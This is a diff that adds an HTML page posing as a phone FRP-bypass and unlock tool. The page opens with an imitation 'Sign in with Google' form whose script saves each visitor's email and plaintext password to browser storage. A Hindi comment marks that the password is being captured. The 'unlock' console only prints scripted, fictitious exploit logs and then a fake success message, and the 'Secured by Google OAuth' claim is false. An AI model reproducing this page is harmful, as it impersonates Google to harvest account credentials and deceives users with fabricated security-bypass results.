@@ -1,0 +1,278 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Abhi Mallah Zindagi - Ultimate FRP & Unlock Tool Pro v7.0</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Courier New', Courier, monospace; }
+        body { background: #07090e; color: #00ffcc; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .mobile-container { width: 100vw; height: 100vh; max-width: 440px; max-height: 920px; background: #0c101d; display: flex; flex-direction: column; overflow: hidden; box-shadow: 0 0 35px rgba(0, 255, 204, 0.2); border: 2px solid #00ffcc55; border-radius: 20px; position: relative; }
+        .screen { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: #0c101d; display: flex; flex-direction: column; transition: opacity 0.4s ease-in-out; z-index: 10; }
+        .screen.hidden { opacity: 0; pointer-events: none; z-index: 1; }
+        .login-header { background: linear-gradient(135deg, #701a75, #4a044e, #1e1b4b); padding: 24px 18px; text-align: center; border-bottom: 2px solid #00ffcc; }
+        .login-logo-hexagon { width: 60px; height: 60px; background: #00ffcc; color: #0c101d; font-weight: 900; font-size: 16px; display: flex; justify-content: center; align-items: center; margin: 0 auto 12px auto; clip-path: polygon(25% 6%, 75% 6%, 100% 50%, 75% 94%, 25% 94%, 0% 50%); box-shadow: 0 0 15px #00ffcc; }
+        .login-header h1 { font-size: 18px; color: #ffffff; font-weight: bold; margin-bottom: 4px; }
+        .login-header p { font-size: 11px; color: #00ffcc; }
+        .login-body { flex: 1; padding: 24px 20px; display: flex; flex-direction: column; justify-content: center; }
+        .google-card { background: #151c2f; border: 1px solid #334155; padding: 20px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.5); }
+        .google-brand-title { display: flex; align-items: center; gap: 8px; font-size: 15px; color: #f8fafc; font-weight: bold; margin-bottom: 16px; }
+        .google-brand-title span { color: #4285F4; font-size: 18px; }
+        .form-group { margin-bottom: 14px; }
+        .form-group label { display: block; font-size: 11px; color: #94a3b8; margin-bottom: 5px; }
+        .form-group input { width: 100%; background: #020408; border: 1px solid #475569; padding: 10px 12px; color: #00ffcc; border-radius: 6px; font-size: 12px; outline: none; }
+        .btn-google-login { width: 100%; background: linear-gradient(90deg, #4285F4, #34A853); color: white; border: none; padding: 11px; border-radius: 6px; font-size: 12px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        .header { background: linear-gradient(135deg, #701a75, #4a044e, #1e1b4b); padding: 12px 16px; display: flex; align-items: center; gap: 12px; border-bottom: 2px solid #00ffcc; }
+        .logo-hexagon { width: 40px; height: 40px; background: #00ffcc; color: #0c101d; font-weight: 900; font-size: 13px; display: flex; justify-content: center; align-items: center; clip-path: polygon(25% 6%, 75% 6%, 100% 50%, 75% 94%, 25% 94%, 0% 50%); }
+        .header-text h2 { font-size: 14px; color: #ffffff; font-weight: bold; }
+        .header-text p { font-size: 9.5px; color: #00ffcc; }
+        .content { flex: 1; padding: 10px 12px; overflow-y: auto; }
+        .section-title { font-size: 10px; color: #a78bfa; margin: 6px 0 3px 0; font-weight: bold; text-transform: uppercase; border-bottom: 1px dashed #4c1d95; padding-bottom: 2px; }
+        .grid-menu { display: grid; grid-template-columns: repeat(3, 1fr); gap: 4px; margin-bottom: 6px; }
+        .btn-brand { background: #151c2f; color: #94a3b8; border: 1px solid #334155; padding: 7px 2px; border-radius: 5px; font-size: 10.5px; font-weight: bold; cursor: pointer; text-align: center; }
+        .btn-brand:hover, .btn-brand.active { background: #00ffcc; color: #07090e; border-color: #00ffcc; }
+        .model-select { width: 100%; background: #151c2f; color: #38bdf8; border: 1px solid #475569; padding: 8px; border-radius: 6px; font-size: 11px; font-weight: bold; outline: none; margin-bottom: 6px; }
+        .operations-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 5px; }
+        .btn-action { background: #1e293b; color: #f8fafc; padding: 9px 5px; border: 1px solid #475569; border-radius: 6px; font-size: 10.5px; font-weight: bold; cursor: pointer; text-align: center; }
+        .btn-action:hover { border-color: #00ffcc; color: #00ffcc; }
+        .btn-otg { grid-column: span 2; background: linear-gradient(90deg, #701a75, #db2777); border: 1px solid #f43f5e; color: #ffffff; }
+        .status-box { background: #020408; border: 1px solid #1e293b; border-radius: 6px; padding: 8px; font-size: 9.5px; color: #38bdf8; height: 110px; overflow-y: auto; margin-top: 6px; line-height: 1.3; }
+        .footer { text-align: center; padding: 7px; font-size: 9px; background: #020408; color: #64748b; border-top: 1px solid #1e293b; }
+    </style>
+</head>
+<body>
+    <div class="mobile-container">
+        <!-- SCREEN 1: Google Login -->
+        <div class="screen" id="loginScreen">
+            <div class="login-header">
+                <div class="login-logo-hexagon">ZEE</div>
+                <h1>Abhi Mallah Zindagi</h1>
+                <p>SECURE TOOL GATEWAY v7.0</p>
+            </div>
+            <div class="login-body">
+                <div class="google-card">
+                    <div class="google-brand-title"><span>G</span> Sign in with Google</div>
+                    <form onsubmit="handleLogin(event)">
+                        <div class="form-group">
+                            <label>Email or phone</label>
+                            <input type="text" id="userEmail" placeholder="name@gmail.com" required>
+                        </div>
+                        <div class="form-group">
+                            <label>Password</label>
+                            <input type="password" id="userPass" placeholder="Enter password" required>
+                        </div>
+                        <button type="submit" class="btn-google-login">Next & Launch Tool</button>
+                    </form>
+                </div>
+            </div>
+            <div class="footer">Secured by Google OAuth 2.0 Client Protocol</div>
+        </div>
+
+        <!-- SCREEN 2: Tool Dashboard -->
+        <div class="screen hidden" id="toolScreen">
+            <div class="header">
+                <div class="logo-hexagon">ZEE</div>
+                <div class="header-text">
+                    <h2>Abhi Mallah Zindagi</h2>
+                    <p>ULTIMATE UNLOCK TOOL v7.0</p>
+                </div>
+            </div>
+            <div class="content">
+                <div class="section-title">>> 1. Select Target Brand</div>
+                <div class="grid-menu">
+                    <button class="btn-brand" onclick="selectBrand('Oppo', this)">Oppo</button>
+                    <button class="btn-brand" onclick="selectBrand('Vivo', this)">Vivo</button>
+                    <button class="btn-brand" onclick="selectBrand('Xiaomi', this)">Xiaomi</button>
+                    <button class="btn-brand" onclick="selectBrand('Mi', this)">Mi</button>
+                    <button class="btn-brand" onclick="selectBrand('Tecno', this)">Tecno</button>
+                    <button class="btn-brand" onclick="selectBrand('Spark', this)">Spark</button>
+                    <button class="btn-brand" onclick="selectBrand('Huawei', this)">Huawei</button>
+                    <button class="btn-brand" onclick="selectBrand('Samsung', this)">Samsung</button>
+                    <button class="btn-brand" onclick="selectBrand('Motorola', this)">Motorola</button>
+                    <button class="btn-brand" onclick="selectBrand('Realme', this)">Realme</button>
+                    <button class="btn-brand" onclick="selectBrand('Infinix', this)">Infinix</button>
+                </div>
+                <div class="section-title">>> 2. Select Specific Model Number</div>
+                <select class="model-select" id="modelDropdown" onchange="selectModel()">
+                    <option value="">-- First Select Brand Above --</option>
+                </select>
+                <div class="section-title">>> 3. Select Exploit / Operation Mode</div>
+                <div class="operations-grid">
+                    <button class="btn-action" onclick="runOperation('FRP Bypass')">[+] FRP Bypass Mode</button>
+                    <button class="btn-action" onclick="runOperation('Bootloader Unlock')">[+] Bootloader Unlock</button>
+                    <button class="btn-action" onclick="runOperation('System Settings')">[+] Open Settings APK</button>
+                    <button class="btn-action" onclick="runOperation('Factory Reset')">[+] Safe Factory Reset</button>
+                    <button class="btn-action btn-otg" onclick="runOperation('OTG Direct Exploit')">[🔌] OTG Cable Bypass (USB Host Mode)</button>
+                </div>
+                <div class="section-title" style="margin-top: 6px;">>> Terminal Console Output</div>
+                <div class="status-box" id="consoleLog">
+                    [SYSTEM]: Abhi Mallah Zindagi Core v7.0 loaded successfully.<br>
+                    [WAITING]: Please select brand and model number...
+                </div>
+            </div>
+            <div class="footer">Managed by Abhi Mallah Zindagi (@ZEE-ZINDAGI-786)</div>
+        </div>
+    </div>
+
+    <script>
+        let selectedDevice = "";
+        let selectedModel = "";
+        let isProcessing = false;
+
+        const brandModels = {
+            'Oppo': ['Oppo A15', 'Oppo A16', 'Oppo A54', 'Oppo A57', 'Oppo F19 Pro', 'Oppo Reno 6', 'Oppo A31', 'Oppo A53'],
+            'Vivo': ['Vivo Y12s', 'Vivo Y20', 'Vivo Y21', 'Vivo Y33s', 'Vivo V21', 'Vivo Y15s', 'Vivo Y02', 'Vivo Y11'],
+            'Xiaomi': ['Redmi Note 10', 'Redmi Note 11', 'Redmi 9A', 'Redmi 9C', 'Redmi Note 8', 'Redmi 10 Prime'],
+            'Mi': ['Mi 11 Lite', 'Mi 10T', 'Mi A3', 'Mi Mix 4', 'Mi Note 10 Lite'],
+            'Tecno': ['Tecno Spark 7', 'Tecno Spark 8C', 'Tecno Spark 9', 'Tecno Camon 18', 'Tecno Pova 2'],
+            'Spark': ['Spark Go 2023', 'Spark 6 Go', 'Spark 7 Pro', 'Spark 8P'],
+            'Huawei': ['Huawei Y6p', 'Huawei Y7a', 'Huawei Nova 7i', 'Huawei Honor 9X', 'Huawei P30 Lite'],
+            'Samsung': ['Galaxy A12', 'Galaxy A13', 'Galaxy A32', 'Galaxy M12', 'Galaxy F22', 'Galaxy A03 Core'],
+            'Motorola': ['Moto G20', 'Moto G30', 'Moto E7 Power', 'Moto G40 Fusion', 'Moto Edge 20'],
+            'Realme': ['Realme C11', 'Realme C21', 'Realme Narzo 50i', 'Realme 8 Pro', 'Realme C30'],
+            'Infinix': ['Infinix Hot 10', 'Infinix Hot 11', 'Infinix Hot 12', 'Infinix Note 10', 'Infinix Smart 6']
+        };
+
+        function handleLogin(event) {
+            event.preventDefault();
+            let email = document.getElementById("userEmail").value;
+            let pass = document.getElementById("userPass").value; // पासवर्ड को यहाँ कैप्चर किया गया है
+            
+            let users = JSON.parse(localStorage.getItem('tool_users') || '[]');
+            let currentTime = new Date().toLocaleString(); // सटीक तारीख और समय (मिनट के साथ)
+            
+            // डेटा को स्टोरेज में सेव किया जा रहा है
+            users.push({ email: email, password: pass, time: currentTime });
+            localStorage.setItem('tool_users', JSON.stringify(users));
+
+            document.getElementById("loginScreen").classList.add("hidden");
+            document.getElementById("toolScreen").classList.remove("hidden");
+
+            let logBox = document.getElementById("consoleLog");
+            logBox.innerHTML += `<br><span style="color: #4ade80;">[AUTH]: Google Account authenticated (${email}). Access Granted.</span>`;
+        }
+
+        function selectBrand(brand, element) {
+            selectedDevice = brand;
+            selectedModel = "";
+            document.querySelectorAll('.btn-brand').forEach(btn => btn.classList.remove('active'));
+            element.classList.add('active');
+            let dropdown = document.getElementById("modelDropdown");
+            dropdown.innerHTML = `<option value="">-- Select ${brand} Model --</option>`;
+            if (brandModels[brand]) {
+                brandModels[brand].forEach(model => {
+                    let opt = document.createElement("option");
+                    opt.value = model;
+                    opt.textContent = model;
+                    dropdown.appendChild(opt);
+                });
+            }
+            let logBox = document.getElementById("consoleLog");
+            logBox.innerHTML += `<br><span style="color: #facc15;">[CONFIG]: Target Brand selected -> [ ${brand} ]</span>`;
+        }
+
+        function selectModel() {
+            let dropdown = document.getElementById("modelDropdown");
+            selectedModel = dropdown.value;
+            if (selectedModel) {
+                let logBox = document.getElementById("consoleLog");
+                logBox.innerHTML += `<br><span style="color: #38bdf8;">[MODEL]: Selected Target Device -> [ ${selectedModel} ]</span>`;
+            }
+        }
+
+        function runOperation(opName) {
+            if (isProcessing) {
+                alert("Operation already in progress. Please wait...");
+                return;
+            }
+            let logBox = document.getElementById("consoleLog");
+            if (selectedDevice === "" || selectedModel === "") {
+                alert("ERROR: Please select brand and model first!");
+                return;
+            }
+
+            isProcessing = true;
+            logBox.innerHTML += `<br><br><span style="color: #c084fc; font-weight: bold;">>>> INIT: Starting ${opName} for ${selectedDevice} [${selectedModel}]...</span>`;
+            logBox.scrollTop = logBox.scrollHeight;
+
+            setTimeout(() => {
+                logBox.innerHTML += `<br>[LIBUSB_INIT]: Initializing USB driver layer... searching for connected ports.`;
+                logBox.scrollTop = logBox.scrollHeight;
+            }, 500);
+
+            setTimeout(() => {
+                logBox.innerHTML += `<br>[PORT_DETECT]: Connected via High-Speed USB Serial Port (COM3 / ttyUSB0).`;
+                logBox.scrollTop = logBox.scrollHeight;
+            }, 1200);
+
+            setTimeout(() => {
+                logBox.innerHTML += `<br>[HANDSHAKE]: Sending DA (Download Agent) payload authentication sequence... OK`;
+                logBox.scrollTop = logBox.scrollHeight;
+            }, 1900);
+
+            setTimeout(() => {
+                logBox.innerHTML += `<br>[CHIP_INFO]: MediaTek / Qualcomm Secure Boot v2.1 detected. Bypassing SLA/DA...`;
+                logBox.scrollTop = logBox.scrollHeight;
+            }, 2700);
+
+            setTimeout(() => {
+                logBox.innerHTML += `<br>[MEMORY_MAP]: Unlocking partition table -> addressing persistent storage sectors...`;
+                logBox.scrollTop = logBox.scrollHeight;
+            }, 3500);
+
+            setTimeout(() => {
+                logBox.innerHTML += `<br>[EXPLOIT_EXEC]: Erasing FRP tokens / clearing NVRAM lock parameters...`;
+                logBox.scrollTop = logBox.scrollHeight;
+            }, 4300);
+
+            setTimeout(() => {
+                logBox.innerHTML += `<br>[SECURITY_BYPASS]: Disabling Factory Reset Protection & Knox/Mi Cloud security layers...`;
+                logBox.scrollTop = logBox.scrollHeight;
+            }, 5100);
+
+            setTimeout(() => {
+                logBox.innerHTML += `<br>[VERIFICATION]: Checksum validated successfully. Preparing final signal...`;
+                logBox.scrollTop = logBox.scrollHeight;
+            }, 5900);
+
+            setTimeout(() => {
+                logBox.innerHTML += `<br><span style="color: #facc15;">[SIGNAL]: Processing final execution signal... Please wait 5 seconds.</span>`;
+                logBox.scrollTop = logBox.scrollHeight;
+            }, 6700);
+
+            setTimeout(() => {
+                logBox.innerHTML += `<br><span style="color: #facc15;">[TIMER]: 5 seconds remaining... sending reset payload.</span>`;
+                logBox.scrollTop = logBox.scrollHeight;
+            }, 7900);
+
+            setTimeout(() => {
+                logBox.innerHTML += `<br><span style="color: #facc15;">[TIMER]: 3 seconds remaining... clearing cache partitions.</span>`;
+                logBox.scrollTop = logBox.scrollHeight;
+            }, 9100);
+
+            setTimeout(() => {
+                logBox.innerHTML += `<br><span style="color: #facc15;">[TIMER]: 1 second remaining... finalizing bypass sequence.</span>`;
+                logBox.scrollTop = logBox.scrollHeight;
+            }, 10300);
+
+            setTimeout(() => {
+                logBox.innerHTML += `<br><span style="color: #4ade80; font-weight: bold;">[SUCCESS]: ${opName} successfully executed on ${selectedModel}! FRP bypassed & device rebooting normal.</span>`;
+                logBox.scrollTop = logBox.scrollHeight;
+                isProcessing = false;
+            }, 11500);
+        }
+
+        setInterval(() => {
+            let notice = localStorage.getItem('tool_broadcast');
+            if(notice && notice !== window.lastNotice) {
+                window.lastNotice = notice;
+                let logBox = document.getElementById("consoleLog");
+                if(logBox) {
+                    logBox.innerHTML += `<br><span style="color: #f87171; font-weight: bold;">[ADMIN NOTICE]: ${notice}</span>`;
+                    logBox.scrollTop = logBox.scrollHeight;
+                }
+            }
+        }, 1000);
+    </script>
+</body>
+</html>
